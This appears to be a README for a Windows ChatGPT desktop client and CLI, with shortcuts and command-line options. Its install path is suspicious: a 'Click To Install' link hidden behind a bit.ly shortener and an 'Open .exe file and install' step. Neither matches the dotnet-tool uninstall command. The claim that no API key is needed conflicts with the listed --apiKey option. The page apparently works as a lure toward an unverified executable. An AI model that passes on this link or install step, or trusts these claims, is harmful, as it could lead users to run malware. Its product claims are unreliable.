# ChatGPT Windows Client | [Click To Install](https://bit.ly/3Tj83de)


A ChatGPT C# client for graphical user interface runs on Windows. Powered by [Avalonia UI](https://avaloniaui.net/) framework.

You do not need to use the OpenAI API key unlike other clients.


![image](https://user-images.githubusercontent.com/2297442/224843834-a58190df-3bdb-4722-b737-94e7adc87805.png)

# Shortcuts

### Main Window

- Ctrl+Shift+A - Toggle between transparent and acrylic blur window style.
- Ctrl+Shift+S - Toggle between visible and hidden window state.

### Message Prompt

- Enter - Send prompt.
- Escape - Cancel edit.
- F2 - Edit prompt.
- Shift+Enter, Alt+Enter - Insert new line.


### Install:
```bash
Open .exe file and install
```

### Uninstall:
```bash
dotnet tool uninstall --global ChatGPT.CLI
```

### Usage

```
ChatGPT.CLI:
An .NET ChatGPT tool.

Usage:
ChatGPT.CLI [options]

Options:
-f, --inputFiles <inputfiles>              The relative or absolute path to the input files
-d, --inputDirectory <inputdirectory>      The relative or absolute path to the input directory
-o, --outputDirectory <outputdirectory>    The relative or absolute path to the output directory
--outputFiles <outputfiles>                The relative or absolute path to the output files
-p, --pattern <pattern>                    The search string to match against the names of files in the input directory
-r, --recursive                            Recurse into subdirectories of input directory search
-e, --extension <extension>                The output file extension
-s, --settingsFile <settingsfile>          The relative or absolute path to the settings file
--temperature <temperature>                What sampling temperature to use, between 0 and 2. Higher values like 0.8 will make the output more random, while lower values like 0.2 will make it more focused and deterministic.
--topP <topp>                              An alternative to sampling with temperature, called nucleus sampling, where the model considers the results of the tokens with top_p probability mass. So 0.1 means only the tokens comprising the top 10% probability mass are considered.
--presencePenalty <presencepenalty>        Number between -2.0 and 2.0. Positive values penalize new tokens based on whether they appear in the text so far, increasing the model's likelihood to talk about new topics.
--frequencyPenalty <frequencypenalty>      Number between -2.0 and 2.0. Positive values penalize new tokens based on their existing frequency in the text so far, decreasing the model's likelihood to repeat the same line verbatim.
--maxTokens <maxtokens>                    The maximum number of tokens to generate in the chat completion.
--apiKey <apikey>                          Override OpenAI api key. By default OPENAI_API_KEY environment variable is used.
--apiUrl <apiUrl>                          Override OpenAI api url. By default OPENAI_API_URL_CHAT_COMPLETIONS environment variable is used.
--model <model>                            ID of the model to use. See the model endpoint compatibility table for details on which models work with the Chat API.
--directions <directions>                  The system message (directions) helps set the behavior of the assistant. Typically, a conversation is formatted with a system message first, followed by alternating user and assistant messages.
-t, --threads <threads>                    The number of parallel job threads
--quiet                                    Set verbosity level to quiet
--version                                  Show version information
-?, -h, --help                             Show help and usage information
```



# License

ChatGPT is licensed under the [MIT license](LICENSE).
